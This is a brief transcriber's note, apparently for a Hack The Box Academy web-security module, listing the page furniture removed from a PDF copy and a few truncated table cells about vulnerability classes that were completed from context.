- the Academy page header and footer on every page: PDF timestamps, page URLs, page counters, repeated links
- the "Go to Questions", "Connect to HTB", "Spawn the target system", "Enable step by step solutions PRO", "Answer questions in English to ensure an accurate response", "Hint", and "Completed" buttons
- the "N / 17 Sections" progress counters and the question point values (`+1`, `+20`)
- the screenshots and embedded demos themselves (i point to each one in the text with a search anchor where it matters)
- a few table cells in my PDF copy were cut off at the right edge (the File Inclusion, Unrestricted File Upload, IDOR, and Broken Access Control rows in the Introduction, and the last site in the NGINX list), so i finished those sentences from context

Q: did i drop any theory or command? A: no, only page furniture.